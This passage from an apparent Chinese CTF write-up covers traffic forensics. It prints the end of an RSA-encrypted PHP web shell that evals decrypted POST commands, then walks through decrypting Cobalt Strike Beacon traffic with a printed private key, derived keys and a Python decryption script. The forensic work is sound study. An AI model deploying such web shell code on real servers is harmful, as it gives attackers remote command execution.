</span></span><span class=line><span class=cl><span class=nv>$pk</span> <span class=o>=</span> <span class=nx>openssl_pkey_get_public</span><span class=p>(</span><span class=nv>$pk</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$cmd</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$cmds</span> <span class=k>as</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>openssl_public_decrypt</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$value</span><span class=p>),</span> <span class=nv>$de</span><span class=p>,</span> <span class=nv>$pk</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cmd</span> <span class=o>.=</span> <span class=nv>$de</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_POST</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>openssl_public_decrypt</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$v</span><span class=p>),</span> <span class=nv>$de</span><span class=p>,</span> <span class=nv>$pk</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=nv>$_POST</span><span class=p>[</span><span class=nv>$k</span><span class=p>]</span><span class=o>=</span><span class=nv>$de</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span></span></span></code></pre></td></tr></table></div></div><p>可以直接用CTF-NetA一把梭</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250515121850746.png alt=/posts/5422d65/imgs/image-20250515121850746.png height=980 width=1500></p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250515121856215.png alt=/posts/5422d65/imgs/image-20250515121856215.png height=980 width=1500></p><h3 class=heading-element id=cobalstrike流量分析><span>CobalStrike流量分析</span>
<a href=#cobalstrike%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>参考链接：https://5ime.cn/cobaltstrike-decrypt.html</p></blockquote><h4 class=heading-element id=密钥对文件的情况><span>密钥对文件的情况</span>
<a href=#%e5%af%86%e9%92%a5%e5%af%b9%e6%96%87%e4%bb%b6%e7%9a%84%e6%83%85%e5%86%b5 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>先从流量包中导出key文件</p><p>然后在 cs-scripts中运行 python3 parse_beacon_keys.py 得到私钥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT+pVELCnX1r
</span></span><span class=line><span class=cl>To4LhSzcP7sPOrIOQg0onSpKO1tzOVX+2DqtZsSFoFrAmrEV+gZCbFfhYR9vs5DGLUg9aa0i5Gqh
</span></span><span class=line><span class=cl>Pz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAEC
</span></span><span class=line><span class=cl>gYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5V
</span></span><span class=line><span class=cl>r7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ+rYnCezQcrt4V3c7BZtW9RjFW
</span></span><span class=line><span class=cl>vHh09PF808Yl4/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL
</span></span><span class=line><span class=cl>3MK+EtafnYIDD1IS+97K0cbg922RKXNdv+kCQQDWJk0kNe8ePBpwJU4slig1Y+4VWuwTRz6r+MNp
</span></span><span class=line><span class=cl>v+WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG
</span></span><span class=line><span class=cl>9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB+aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3C
</span></span><span class=line><span class=cl>dsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJB
</span></span><span class=line><span class=cl>AIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2
</span></span><span class=line><span class=cl>ddsyNI6XbCU=
</span></span><span class=line><span class=cl>-----END PRIVATE KEY-----</span></span></code></pre></td></tr></table></div></div><p>在数据包的HTTP请求中获得Cookie，然后修改CS_Decrypt中的 Beacon_metadata_RSA_Decrypt.py 的私钥和Cookie</p><p>运行即可得到 AES和HMAC key</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>AES key:ef08974c0b06bd5127e04ceffe12597b
</span></span><span class=line><span class=cl>HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9</span></span></code></pre></td></tr></table></div></div><p>然后把这两个key填入 Beacon_Task_return_AES_Decrypt.py 中</p><p>把流量包中的POST数据包中的data的值用CyberChef (from hex+to base64) 处理后得到的数据填入上面那个脚本中</p><p>一个个解密每个POST数据包中的data即可得到flag</p><p>我把上面的步骤整合成了下面一个脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>javaobj.v2</span> <span class=k>as</span> <span class=nn>javaobj</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_v1_5</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>format_key</span><span class=p>(</span><span class=n>key_data</span><span class=p>,</span> <span class=n>key_type</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>key_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=n>key_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>formatted_key</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;-----BEGIN </span><span class=si>{</span><span class=n>key_type</span><span class=si>}</span><span class=s2> KEY-----</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>formatted_key</span> <span class=o>+=</span> <span class=n>base64</span><span class=o>.</span><span class=n>encodebytes</span><span class=p>(</span><span class=n>key_data</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>formatted_key</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;-----END </span><span class=si>{</span><span class=n>key_type</span><span class=si>}</span><span class=s2> KEY-----&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>formatted_key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_key</span><span class=p>(</span><span class=n>keyfile</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>keyfile</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>fd</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pobj</span> <span class=o>=</span> <span class=n>javaobj</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>privateKey</span> <span class=o>=</span> <span class=n>format_key</span><span class=p>(</span><span class=n>pobj</span><span class=o>.</span><span class=n>array</span><span class=o>.</span><span class=n>value</span><span class=o>.</span><span class=n>privateKey</span><span class=o>.</span><span class=n>encoded</span><span class=o>.</span><span class=n>data</span><span class=p>,</span> <span class=s2>&#34;PRIVATE&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>publicKey</span> <span class=o>=</span> <span class=n>format_key</span><span class=p>(</span><span class=n>pobj</span><span class=o>.</span><span class=n>array</span><span class=o>.</span><span class=n>value</span><span class=o>.</span><span class=n>publicKey</span><span class=o>.</span><span class=n>encoded</span><span class=o>.</span><span class=n>data</span><span class=p>,</span> <span class=s2>&#34;PUBLIC&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>privateKey</span><span class=p>,</span><span class=n>publicKey</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_AES_HMAC_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=p>,</span><span class=n>encode_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    提取协商密钥
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>private_key</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>import_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>PKCS1_v1_5</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>private_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encode_data</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\xBE\xEF</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_keys</span> <span class=o>=</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>24</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_hash256</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>raw_aes_keys</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>aes_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>hmac_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;AES key: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>aes_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;HMAC key: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>hmac_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>        <span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>aes_key</span><span class=o>.</span><span class=n>hex</span><span class=p>(),</span><span class=n>hmac_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_submit_data</span><span class=p>(</span><span class=n>SHARED_KEY</span><span class=p>,</span><span class=n>HMAC_KEY</span><span class=p>,</span><span class=n>encrypt_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    使用协商密钥解密CS的数据
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=n>SHARED_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>shared_key</span><span class=p>,</span> <span class=n>hmac_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hmac_key</span><span class=p>,</span> <span class=n>encrypted_data</span><span class=p>,</span> <span class=n>digestmod</span><span class=o>=</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span> <span class=o>!=</span> <span class=n>signature</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message authentication failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>shared_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data_length</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data_l</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[</span><span class=mi>4</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data1</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[:</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>signature</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>:</span><span class=n>encrypt_data_length</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>iv_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijklmnop&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>data1</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>SHARED_KEY</span><span class=p>,</span> <span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>80</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;counter: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;任务返回长度: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;任务输出类型: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>dec</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>keyfile</span> <span class=o>=</span> <span class=s2>&#34;key&#34;</span> <span class=c1># 题目一般会提供，该文件本质上为 KeyPair 的 Java 对象</span>
</span></span><span class=line><span class=cl>    <span class=n>privateKey</span><span class=p>,</span><span class=n>publicKey</span> <span class=o>=</span> <span class=n>extract_key</span><span class=p>(</span><span class=n>keyfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(privateKey)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 协商密钥和主机信息被使用 rsa 公钥加密之后放在了心跳包的 cookie 中</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie_data</span> <span class=o>=</span> <span class=s2>&#34;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span><span class=p>,</span><span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>get_AES_HMAC_key</span><span class=p>(</span><span class=n>privateKey</span><span class=p>,</span><span class=n>cookie_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>submit_data</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;000000e046950d669f91c7c7d9a7580c78f13a9f568122f2a8aba597a52f3832b0afbde054602fe158dbe173ff2532036facafdada898e3c9d798ea5e803269221fef2436fc22428e4d4aac53979ce80dd4809a2d3391dfdb1ea043e9761250175b0ceb38157319e366af76a88464f7d8672e614a051ca4fa846d6e22ee654ce0271381867f13c44ee15a26fc03316596f64bb0786e16af8a8fd900f7d0c7fa895c408e3915fa6a9a5085df6854c34dbf55d968d7f69b00b12083750c30564f94547f6eb6ee62beacda5a73d72ea7d81c79919802aecafed6d991bd0b1b18e04fca5c480&#34;</span><span class=p>,</span><span class=s2>&#34;00000040e992086d1e786eeb9b4329bf6eee6f593e44609505d7d0118af590b5e40840782232f30b12ed76f54ef4898d69470498cb4afe43841790fe12af184011858984&#34;</span><span class=p>,</span><span class=s2>&#34;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&#34;</span><span class=p>,</span><span class=s2>&#34;000000e0453bf91036fff19e04ce60d065f37f4ed23345246fa7b5ce91d64de96781604717aa720a0f411cf5545d66c750ff0ee7aaa7f4be7e7070ba1ff180f6373d670c7b0e8c73617ec9e3f388a4f99a3d00aca4e85e80db6a8e1a661da37b184b2d779d2d5f6e594ca4c81b3c2fe16856b24d2d6551fed5f79540fcc4ca1ce66168d32f656ea5b7f66d26ae99812a6612da54670acc82524160fc765c1c8cc89cdf110fe4a40a195aa693bd98965abc3244f5c4bd89c104dafcd5e87542dfd90751cf8ea82a769070b01d9af4b037e1ba618de23a378d83104375cc9745893ddc5482&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>submit_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>item</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>decrypt_submit_data</span><span class=p>(</span><span class=n>SHARED_KEY</span><span class=p>,</span><span class=n>HMAC_KEY</span><span class=p>,</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    </span></span></code></pre></td></tr></table></div></div><h4 class=heading-element id=给beacon的情况><span>给Beacon的情况</span>
